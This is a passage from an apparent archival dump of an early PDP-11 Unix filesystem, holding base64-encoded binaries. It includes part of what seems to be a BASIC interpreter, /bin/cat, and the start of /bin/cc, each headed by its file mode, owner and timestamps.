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
kGGhIaIhoyGkIaAQA=
-- /bin/cat mode=0100775 uid=3 gid=3 atime=174929305 mtime=174922517 base64=1 --
BwGIAAAAAgQAAAAAAAABAIUV1gvCFYgCVyEBABEDxQokB4AVF6ItAAMCNwpqBAgBNxACAA
WJAAAAAPGHNxBYBMAdVAQDiYgAAAIKhwQQCAPDFYgAwJT3CSYAxAr7AvABwB00BNwDBona
AcLliAIHA7cQCADAFQEABImIAgAAAYkSkJcgiAQHh8AVAQAEiYgCAALCFYgChwA=
-- /bin/cc mode=0110775 uid=3 gid=3 atime=174927967 mtime=174922552 base64=1 --
CAHAGEIDWBEAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JFhgBiXcJcBjG5RAAAAo1EO
r/NRDs/zUQ9P81EPb/NRDy/18AoAFAHfL/wAxAbQYAABIAnAEAARAAChdyAgDBDMFlDCAZ
EEEUISD+AnkAFAC3Cs4vtwrML18AoAG3CsYvXwCgAbcKwC/3FXAgiB9fAKABtwqqL+4B9x
V9IHgf9xWKIGwf9xWTIGgfXwCgAUAd8v/ADEBtBgAAEvCLAgAFAvcVnCBQH18AoAH3Fagg
Rh/1FQEA7P9qAUAd8v/ADEBtBgAAEvClMAACAAMC9xW1IB4fQB3y/8AMQG0GAAAS8KUxAA
IAAwL3Fb8gBh9AHfL/wAxAbQYAABLwpTIAAgBGAvcVySDuHkIBQB3y/8AMQG0GAAASyKUt
AIYDQB3y/8AMQG0GADUS+P9OHfj/3wlGDcAlYwARAkAd9v/ADLUK9v9wHfj/ai/OFW8AZh
34/98Jfg3WCzUQ+P9OHfj/5hXOL98JXg7WC8ALEQNAHfT/wAy1CvT/cB34/84vTh34/98J
Rg3AJW8AAgK1Cur/tQry/3UtBADy/7gG9Qv2/wICXwBoBPcLei4mAs4V0yDfCUAONxBKKQ
gBTh3u/98JsBTAHTwpsIoJAA4K5h0yKd8J7BXWCzUQ7v8FBe4BwB0gKbCKCQDOFQAB5h0U
Kd8JxhTWC8AL8wXOFQEA5hUCAN8JzhbWC8A1AQAHAs4VNAXmFQIA3wnOFtYLzh3kKN8JQA
43EN4o8JUxAAgAzh3SKN8JQA43EM4o8JUyAAgAzh3AKN8JQA43EL4o8JUzAAgA9wvWLQkD
zh2oKN8JQA43EKoo8JU1AAgA9wu4LQkCzh2QKN8JQA43EJAo8JU0AAgANQry/18AXAT1JQ
EA9v8KBEAd8v/ADA4cai/mFd4g3wmOEtYL9xXjIEws9wt2LQwDzhVpAEAd8v/ADCYcai/f
CX4N1gs3EEIoQB3y/8AMDhxqL98JfAU3EB4s9wtGLQIDXwBYBPcLVi0CA18AWATACwICXw
BUBPcdCij+K/cdBij6K/cLJi0GA/cV5iDwKzcK7isCATcK5ivOFQYv5h3UHN8JqA3WC8AL
AgNfAFQE9xXpIMIr9x3MJ74r9x3IJ7or9wviLAwDzhVzAEAd8v/ADCYcai/fCX4N1gs3EK
on9x2mJ5gr9wvCLAMD9x2eJ4wrNwqKK84VBi/mHXoc3wmoDdYLwAtfAvcLoCwWA/cV7CBk
K/cddidgK/cdbCdcKzcKWivOFQYv5h1OHN8JqA3WC84dWCffCdwX9wtqLEUC9xXvIDIr9x
XyIC4r9x06JyorNwooK84dLCffCaQOzh0mJ98JpA7OHSIn3wmkDs4VBi/mFfQg3wmoDdYL
zhVvAEAd8v/ADCYcai/fCX4N1gs1EPj/DhDfCaQOTh34/+YV/CDfCcwV1gvACwYCzhUCId
8JpA7ACwkDTh34/+YVCCHfCY4S1gu3CuArtQry/3Ut9v/y/wIHXwCYAvcLzCtfAvUL9P9c
AzUK8v/3FRkhiCr3FRwhhCr3HYIbgCr1FQMA8P8NAUAd8P/ADLUK8P9BHfL/wQy1CvL/cB
zOLwYvdS30//L/7wb1C+z/CQNAHfD/wAy1CvD/8BUfIQYvEAFAHfD/wAy1CvD/8BUjIQYv
QB3w/8AMtQrw//AVJyEGL0Ad8P/ADLUK8P8wCgYvzhUGL+YVKiHfCagN1gv1JQEA9v8OAv
UlAQDq/woCzhVvAOYdSirfCX4N1gsOEN8JpA73CQQAdwBmE3cJVBP3C/gqGwLOHdIl3wmk
Ds4dzCXfCaQO9wvkKgQCzh3AJd8JpA7OHbol3wmkDs4dtCXfCaQOzh2iJd8JpA73CZ4Sdw
AeE3cJDBPG5aYONwrGKkARwGX0/TcQsCo3EKoqQBHAZe77NxCkKs4dnipmHQQA3wkkFdYL
wAsJBEAdBABfADYHzh+EKt8JsBT3Ac4deirfCYgVwCUjAPQCwB1sKrAKAgDAHWQq8AoEAE
ARwGXo+TcQWipAEcBlGPI3EFoqBAoBEVdwCgBBYTGKGPIBEVdwCgBBYTEKIPKECsQlyADw
Bs4VMiHmFVIw3wkQCtYLzhU5IeYVVDDfCRAK1gvOFUEh5hVWMN8JEArWC84VRyHmFVgw3w
kQCtYLzhVNIeYVWjDfCRAK1gvOFVQh5hVcMN8JEArWC/cVQiPwKTcK6Ck3CuYpQBHAZVTx
NxDGKTcKxCnOHbop5h2KJN8JChbWC8ALMQTOHXwk5hVZId8JjhLWC/cJiP4nAfctkimMKQ
oC9wt6KQcCzh2GKeYVAQDfCWYW1gv1pSMAVPEOA/cLiikLAsMdbikGAc4dZCkmEd8JZhbW
C8SU+ALOHVQp5hUKAN8JZhbWC/cJOgDAC9UCwx1CKQYBzh04KSYR3wlmFtYLxJT4As4dKC
nfCYoWzh8gKd8JsBTOHxQp3wmwFMAd5CN3AGARdwlOEcblBgD3Lfwo+CgCArcK/ij3Hfgo
9Cg/ivAoAgr3CW4DBBDEJSMAAgNfAOoJwhUBAF8A6gnECwICXwD0CcQlYQADBsQlegALBM
QlQQADBsQlWgAFBMQlXwACA18AJAn1Hago9v8OEd8JZAr3CSADBBDEJWEAAwbEJXoA9ATE
JUEAAwbEJVoA7gTEJTAAAwbEJTkA6ATEJV8A5QMOCt8JZAr3CmYowiUDACUE9wt0KBQCzh
X//2Yd9v/fCbYL1gvIiwIDAAoCAcAVAQCAYMAlBQADArcKSigIAbcKRigFAcQLBgP3CagC
BBDEJQoA+AIAEXcAaBDCJQIAAwL3CyQoDgIOEd8JRAuOEGYd9v/fCbYL1gs1EPj/9wl0Ag
QQwiUBAEMC9S3uJ/j/EALCFQIAXwDqCcIVAwBfAOoJwhUEAF8A6gnCFQUAXwDqCfUtyCf4
//AD9S3GJ/j/8AP1Lbwn+P/wA/Utsif4/xEC9wu0JwMD9wquJ7kB9wumJwMD9wqgJ7MBzh
VpId8JMAquAc4VdyHfCTAKBQHEC6oD9wnwAQQQxCUKAPgCowHCJQIAAgNfAOoJ9wtsJ5gC
QB34//AdZCcIAA4R3wmgCvcJwgEEEMQlCgAGAg4K3wmgCsAVAQCIAcQL+APuAQMRwyUnAA
MDwyUiAFYCzhDfCWQK9R0MJ/T/twrwJhABxCUKABIDxAsQAw4R3wlkCsQlXAAFAvcJbgEO
EN8JZAr3CWQBBBDEIOsCNwrAJvcL6iYCA18AJgjCJQMALgL3C9omAgNfACYIP4q4JvcJOA
EEEMQlCgACA8QL+AL3LaAmmiYEAs4ViSHfCTAKzh2QJmYd9P/fCSQV1gvACwkETh30/+YV
miHfCTAK1gtfACwI9x1sJmYmXwAsCA4R3wlkCvcJ5AAEEMQlCgACA18AcgcOCt8JZArCJQ
EAAgVfACwIzhWqId8JMApfACwIdwl4Ds4VAQBmHQYA3wm2C9YLBBA9EQQANBEIAHcAag53
CVgOzh0UJuYVuSHfCY4S1gtOHQYAZh0EAN8JjhLWC84VCgDfCUAUtwryJbcK2CV3ADYOdw
kkDsQd3CXAHdolwGXCAAAhBALOFb4h3wkwClSdBADAHcIlwGXDAAAhBIPEHbYlxGXDADcR
rCV3APoNdwnoDX+dBAC4JbcKtCXAHbAlwOVCI8Al0AcGBs4VzCHfCTAK9wls+ncAzg13Cb
wN9wmCAAQQxCUvADIC9wtSJS8C9wlwAAQQxCUqAB0DDhHfCUQLwBUvAHcAng0ACvwB9wlS
AAQQxCUvABEC4QH3LTAlLCUJAs4dLCXmFQoA3wlmFtYLtwokJfcJKgAEEAARwRU6IDcQCB
URIP4CeQAGAAAR2gF3CUQNtwr+FH+dBAD4FHcARA13CTIN/4vsFAYDwJ/mFPcK4hR3AC4N
NwrOJM4dzCTfCYgVBBAXBPctxCS+JBMCzh+8JN8JsBT3HbIkriTOHbAk5hUKAN8JZhbWC7
cKqCT3Ca7/BBDECwIEAArbAQAR2QF3CdIMxuUGAEQdBAAACjUQ+P81EPT/AwF1bfb/+P8A
lTUQ9v/5AkEd+P/ADTdyHBR1EPj/V3AKAEIQwm1cJDIBgxBEHQQAE6MUAtSLBgNAHQQAwG
UIAAAh9gL1CwYABgKOEGYdBADfCbAM1guAEHcAcgzCZQoAwR3SE1dwCgDBbRgkgSAPh0Ad
9P+1CvT/wAsHA84V3iHfCTAK9wng+AIBwh32I8qLzAL1CwYA3wdDHQQAhBADAdSSAQODCo
AQwGUIAAAh+IfSAXcJCgzAHdIlwOWQMcAlyAAJBM4dxCX3CsAl5hXvId8JMArWC3+dBACw
JbcKrCV3AOoLdwnYC3cdBACOI/cVkDGYJcAdeiO3CnYjwCVkAAYEzhUIIt8JMAp3AMALQB
0GAAQcCAD5Aw4cCABmHQYA3wlgEtYLwAsHA8yL7gMAlQ4Q3wlkCvkBzhUgAN8JfgzMpSgA
EwIOEd8Jvg7OFSAA3wl+DPclkDEyJdeG9wosJcCfKCUOEN8JRAv0AcyL7gMAlQ4Q3wl+DP
kBdwlCC0MdBAAECgQBwiUvAPsDhArClPoCw+UDAMQlDgAJBcQlAgAGBNOlLgADAsCSdwAg
CwAK/AF3CQoLTh0EAN8JQA4DEMQQBAHUpS8AAQIDEcyL+gJ0nQYA///AEHcA8gp3CeAKxu
UEAPcJWAc1EPj/NwJOHQYAZh0EAN8J5BTWC04dBADmFR8i3wmOEtYLzhUBAN8JFhhOEc5l
9v/fCfYXQC34//gCQB32/8BFAP81EPj/DwPAJQ4ADAPAJQIABwNOHQQA5hU5It8JjhLWC/
cJGvdAHfb/F3T4/8BFAP8KAfUl///4/9cCzhUuIt8JjhLAFQEAdwBaCncJSArEHbgRQx0E
AMAdsBG3CqwRyJT6AgARdwA8CncJKgpDHQYAzhDfCUYNwCVvAAgDwBUBAAMBwgsRAgAKdw
AYCkAdBAD1ZQIABAAEEvEDwpQDAwCVgCD7A8yL7QNDHQYA7wF3CeQJ9QsEAAMCAAp3AOYJ
Th0EAN8J3Bf5AXcJygnG5ToBQBHAZcr+NRDI/kAdyP61Csj+QR0EALUKBABIkvYCQBHAZc
r+NRAEADUKxv4CAbUKxv5OEc5lBADfCS4QQR3G/sEMQWExEG7/8gJAEcBllv81EDD/9wmu
+zUQwP7AJSAA+QPAJSgABgPOFUwi3wkwCncAYAlOHcD+3wlECzUKxP4CAbUKxP5OEc5lMP
/fCbYQQR3E/sEMQWExEEb/8gJ1Lcb+xP4DA84VcCLgAUCfBAC1CgQANRDA/tsDDhDfCfwR
wAsFAk4dwP7fCX4M7wFAEcBlMv81EC7/fZ3A/i7/tQou/wcBfZ8EAC7/tQou/7UKBABAnw
QADhDfCTQSwAvyAj2KLv81CsT+EAFAHcT+wAxAYQ4cbv9mEc5lMv/fCWAS1gvACwYCtQrE
/nUtxv7E/uwGdS3G/sT+BwdAHcT+wAxAYQAcRv8DAUARwGUy/zUQLv/9iy7/qgNAny7/Dh
C1Ci7/3wl+DPUBdwlaCMblBABAHwQAAJI1EPb/QB8EAL0KBAAIivUlKQD2/wMCAAp3AEII
QB8EAMilIAADAr0KBAD4AXUfBAD4/0AfBAAAkjUQ9v/AJSwAFgPAJSkAEwMOEN8JNBLACw
oDfS34/wQADQJOHfb/3wn8EcALBwLOFYki3wkwCkAd+P/SAb0KBADcAXcJ0gfG5QgANQry
/3UfBAD4//cJAPrAJSkAAgNfAMgRAAp3AL4H9SVcAPb/EAL3CeT5NRD2/0At9P8JA8AlXA
AGA0AfBAC9CgQAyJVcAEAfBAC9CgQASJ32/zAB9SVcAPb/RQL3Ca75NRD2/8AlIgAJA8Al
XAAGA0AfBAC9CgQAyJVcAEAfBAC9CgQASJ32/0AB9SUiAPb/BAP1JScA9v/dAnUd9v/0//
UlJwD0/wYCQB8EAL0KBADIlScA9wlW+TUQ9v9ALfT/BwPAJQoAqwLOFaki3wkwCvUlJwD0
/xkCQB8EAL0KBADIlScAEgFAHwQAvQoEAEid9v/1JSgA9v8CArUK8v/1JSkA9v8CAvUK8v
/3CQD5NRD2/8AlLAADA8AlKQC2AvUL8v+zBkAfBAC9CgQACIpOHfb/3wlEC0Ad+P9fANgQ
dwmMBvUlYQAEAAQG9SV6AAQADAT1JUEABAAEBvUlWgAEAAQE9SVfAAQABALAFQEAdwBqBg
AK/AF3CVQGTh0EAN8J/BHACwgC9SUwAAQACAb1JTkABAAEBcAVAQB3AD4GAAr8AXcJKAbm
C0CfBAA1EPj/tQoEAEGfBgC1CgYAQCAGAsAL8gLAFQEAdwAQBgAK/AF3CfoFxuV+AHcdBA
DGH0QRxGUGAMCfvB8JA7cKth8XICUABgMOEN8JQBT0AXcA3AU3CqIfNwqiH9evmB8tAAQC
twqQH7cKjh/3CCgBdxCCHzcKhB8XIC4ABAL3CBYBdxB4H4MRw2UEAMEVwCJCFNoDESD8Ak
oAARUFBAEL05UtAAEBARX3CQIAUgEAChdyCgBmEAEQAgP3CfD/gBXAZTAAE5CHABOVAQLD
ChOVQALDCj4BwR0kHwMKAhPSiwIDgwpEfgIVOAHCFegiAgHCFewiARUFA/cLAh8CA9OVMA
AACvcJAgAkAWYQCnYCA/cJ9v+AFYBMAgDAZTAAFyA5AAIHwGUHABOQhwDAHc4ewh3IHvcJ
lAAMAcAdwB7CHboe9wmGAAUBBBU3FaoedwDm/oIRwmUEAIPgJhHmFSAAxBADC8Ntjh4GB/
cLjB4DAt8JQBTDfsQLBAOOlN8JQBQEf8MLBQfOFSAA3wlAFMN+1guEFXcAoP43CmAeAQrA
n1YetwpSHsDlMAAXIPr/AgIAFQMBFyAJAAaCtwo+HldwCgABYOwBwGUwAIMAxGUIANOVPw
CHAGYRhRHAHSYeBAL3CSwAwB0cHlCdBAAHA7cKEh73CgweAgb3CRQAQB0EAIUVhwBmEYUR
9wkEAIUVhwDAHfAdCgPA5XAyNxBsDsAd3h0BAoAKAInwIvcVcDLUHfcVAALMHdctxh0CAA
OC9xUBAL4dhwBmEYURQB0EAAaJAoZ3AOgDAAqFFYcAZhGFEXcdBAAoDncdBgAkDgCJ9iIC
hncAyAOFFYcAZhGFEXcdBAAQDncdBgAMDvcLYh0FA+YVEPDmFQQVBgAAifwidwCcA2YRhR
